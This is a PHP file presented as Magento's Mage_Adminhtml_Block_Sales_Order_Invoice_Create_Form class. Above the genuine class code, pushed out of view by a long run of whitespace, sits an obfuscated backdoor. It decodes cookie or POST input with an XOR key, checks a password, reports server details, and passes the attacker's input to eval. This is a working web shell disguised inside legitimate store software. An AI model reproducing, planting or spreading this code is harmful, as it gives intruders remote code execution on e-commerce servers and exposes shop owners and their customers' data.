<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $i048c1 = 110;$GLOBALS['x2e4ecb7a']=Array();global$x2e4ecb7a;$x2e4ecb7a=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['f6c83b3']="\x67\x43\x7d\x36\x6c\x5d\x4a\x50\x77\x27\x68\x28\x4e\x30\x5c\x61\x71\x47\x33\x7e\x58\x40\x21\x79\x55\x7b\x7c\x4d\x38\x60\x29\x74\x2b\x72\x6d\x23\x56\x6e\x73\x51\x6b\x2f\x24\x76\x22\x39\x46\x4f\x3d\x69\x66\x48\x32\x5f\x53\x49\xd\x2c\x3c\x3b\x3a\x2d\x54\x4b\x42\x5a\x2e\x62\x3e\x52\x59\x5e\x78\x45\x35\x31\x6f\x34\x25\x41\x5b\x20\x2a\x9\x57\xa\x7a\x6a\x4c\x65\x37\x70\x64\x63\x75\x3f\x26\x44";$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][28]]=$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][10].$x2e4ecb7a['f6c83b3'][33];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][0].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][52]]=$x2e4ecb7a['f6c83b3'][76].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][92];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][52]]=$x2e4ecb7a['f6c83b3'][38].$x2e4ecb7a['f6c83b3'][31].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][37];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][92]]=$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][37].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][53].$x2e4ecb7a['f6c83b3'][38].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][31];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][23].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][52]]=$x2e4ecb7a['f6c83b3'][38].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][86].$x2e4ecb7a['f6c83b3'][89];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][37].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][15]]=$x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][10].$x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][43].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][38].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][76].$x2e4ecb7a['f6c83b3'][37];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][52]]=$x2e4ecb7a['f6c83b3'][94].$x2e4ecb7a['f6c83b3'][37].$x2e4ecb7a['f6c83b3'][38].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][86].$x2e4ecb7a['f6c83b3'][89];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][52].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][75]]=$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][38].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][53].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][76].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][89];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][31].$x2e4ecb7a['f6c83b3'][90].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][13]]=$x2e4ecb7a['f6c83b3'][38].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][31].$x2e4ecb7a['f6c83b3'][53].$x2e4ecb7a['f6c83b3'][31].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][34].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][53].$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][34].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][31];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][52]]=$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][52].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][50];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][34].$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][28]]=$x2e4ecb7a['f6c83b3'][86].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][75].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][28];$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][23].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][52].$x2e4ecb7a['f6c83b3'][77]]=$_POST;$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][13]]=$_COOKIE;@$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][92]]($x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][76].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][53].$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][76].$x2e4ecb7a['f6c83b3'][0],NULL);@$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][92]]($x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][76].$x2e4ecb7a['f6c83b3'][0].$x2e4ecb7a['f6c83b3'][53].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][76].$x2e4ecb7a['f6c83b3'][33].$x2e4ecb7a['f6c83b3'][38],0);@$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][92]]($x2e4ecb7a['f6c83b3'][34].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][72].$x2e4ecb7a['f6c83b3'][53].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][72].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][94].$x2e4ecb7a['f6c83b3'][31].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][76].$x2e4ecb7a['f6c83b3'][37].$x2e4ecb7a['f6c83b3'][53].$x2e4ecb7a['f6c83b3'][31].$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][34].$x2e4ecb7a['f6c83b3'][89],0);@$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][31].$x2e4ecb7a['f6c83b3'][90].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][13]](0);$vad76764=NULL;$f61d9=NULL;$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][34].$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][3].$x2e4ecb7a['f6c83b3'][15]]=$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][45].$x2e4ecb7a['f6c83b3'][75].$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][61].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][61].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][75].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][45].$x2e4ecb7a['f6c83b3'][61].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][45].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][61].$x2e4ecb7a['f6c83b3'][75].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][90].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][52].$x2e4ecb7a['f6c83b3'][52].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][90];global$mbe566a;function za8188($vad76764,$l51fbbc54){global$x2e4ecb7a;$sb42ffd="";for($bb87=0;$bb87<$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][52]]($vad76764);){for($y35eb3=0;$y35eb3<$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][52]]($l51fbbc54)&&$bb87<$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][52]]($vad76764);$y35eb3++,$bb87++){$sb42ffd.=$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][28]]($x2e4ecb7a[$x2e4ecb7a['f6c83b3'][0].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][52]]($vad76764[$bb87])^$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][0].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][52]]($l51fbbc54[$y35eb3]));}}return$sb42ffd;}function f3625f($vad76764,$l51fbbc54){global$x2e4ecb7a;global$mbe566a;return$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][34].$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][28]]($x2e4ecb7a[$x2e4ecb7a['f6c83b3'][34].$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][50].$x2e4ecb7a['f6c83b3'][28]]($vad76764,$mbe566a),$l51fbbc54);}foreach($x2e4ecb7a[$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][67].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][13]]as$l51fbbc54=>$k4ad46){$vad76764=$k4ad46;$f61d9=$l51fbbc54;}if(!$vad76764){foreach($x2e4ecb7a[$x2e4ecb7a['f6c83b3'][23].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][77].$x2e4ecb7a['f6c83b3'][52].$x2e4ecb7a['f6c83b3'][77]]as$l51fbbc54=>$k4ad46){$vad76764=$k4ad46;$f61d9=$l51fbbc54;}}$vad76764=@$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][4].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][18].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][52]]($x2e4ecb7a[$x2e4ecb7a['f6c83b3'][49].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][52]]($x2e4ecb7a[$x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][92].$x2e4ecb7a['f6c83b3'][52].$x2e4ecb7a['f6c83b3'][28].$x2e4ecb7a['f6c83b3'][93].$x2e4ecb7a['f6c83b3'][75]]($vad76764),$f61d9));if(isset($vad76764[$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][40]])&&$mbe566a==$vad76764[$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][40]]){if($vad76764[$x2e4ecb7a['f6c83b3'][15]]==$x2e4ecb7a['f6c83b3'][49]){$bb87=Array($x2e4ecb7a['f6c83b3'][91].$x2e4ecb7a['f6c83b3'][43]=>@$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][37].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][74].$x2e4ecb7a['f6c83b3'][15]](),$x2e4ecb7a['f6c83b3'][38].$x2e4ecb7a['f6c83b3'][43]=>$x2e4ecb7a['f6c83b3'][75].$x2e4ecb7a['f6c83b3'][66].$x2e4ecb7a['f6c83b3'][13].$x2e4ecb7a['f6c83b3'][61].$x2e4ecb7a['f6c83b3'][75],);echo@$x2e4ecb7a[$x2e4ecb7a['f6c83b3'][23].$x2e4ecb7a['f6c83b3'][89].$x2e4ecb7a['f6c83b3'][15].$x2e4ecb7a['f6c83b3'][52]]($bb87);}elseif($vad76764[$x2e4ecb7a['f6c83b3'][15]]==$x2e4ecb7a['f6c83b3'][89]){eval/*kadde62*/($vad76764[$x2e4ecb7a['f6c83b3'][92]]);}exit();} ?><?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Mage
 * @package     Mage_Adminhtml
 * @copyright  Copyright (c) 2006-2016 X.commerce, Inc. and affiliates (http://www.magento.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Adminhtml invoice create form
 *
 * @category   Mage
 * @package    Mage_Adminhtml
 * @author      Magento Core Team <core@magentocommerce.com>
 */
class Mage_Adminhtml_Block_Sales_Order_Invoice_Create_Form extends Mage_Adminhtml_Block_Sales_Order_Abstract
{
    /**
     * Retrieve invoice order
     *
     * @return Mage_Sales_Model_Order
     */
    public function getOrder()
    {
        return $this->getInvoice()->getOrder();
    }

    /**
     * Retrieve source
     *
     * @return Mage_Sales_Model_Order_Invoice
     */
    public function getSource()
    {
        return $this->getInvoice();
    }

    /**
     * Retrieve invoice model instance
     *
     * @return Mage_Sales_Model_Order_Invoice
     */
    public function getInvoice()
    {
        return Mage::registry('current_invoice');
    }

    protected function _prepareLayout()
    {
      /*  $infoBlock = $this->getLayout()->createBlock('adminhtml/sales_order_view_info')
           ->setOrder($this->getInvoice()->getOrder());
       $this->setChild('order_info', $infoBlock);
*/
     /*  $this->setChild(
          'items',
            $this->getLayout()->createBlock('adminhtml/sales_order_invoice_create_items')
        );
        */
        $trackingBlock = $this->getLayout()->createBlock('adminhtml/sales_order_invoice_create_tracking');
       //$this->setChild('order_tracking', $trackingBlock);
          $this->setChild('tracking', $trackingBlock);


              /*
        $paymentInfoBlock = $this->getLayout()->createBlock('adminhtml/sales_order_payment')
           ->setPayment($this->getInvoice()->getOrder()->getPayment());
        $this->setChild('payment_info', $paymentInfoBlock);
        */
        return parent::_prepareLayout();
    }

    public function getSaveUrl()
    {
        return $this->getUrl('*/*/save', array('order_id' => $this->getInvoice()->getOrderId()));
    }

    public function canCreateShipment()
    {
        foreach ($this->getInvoice()->getAllItems() as $item) {
            if ($item->getOrderItem()->getQtyToShip()) {
                return true;
            }
        }
        return false;
    }

    public function hasInvoiceShipmentTypeMismatch() {
        foreach ($this->getInvoice()->getAllItems() as $item) {
            if ($item->getOrderItem()->isChildrenCalculated() && !$item->getOrderItem()->isShipSeparately()) {
                return true;
            }
        }
        return false;
    }

    public function canShipPartiallyItem()
    {
        $value = $this->getOrder()->getCanShipPartiallyItem();
        if (!is_null($value) && !$value) {
            return false;
        }
        return true;
    }

    /**
     * Return forced creating of shipment flag
     *
     * @return integer
     */
    public function getForcedShipmentCreate()
    {
        return (int) $this->getOrder()->getForcedDoShipmentWithInvoice();
    }
}
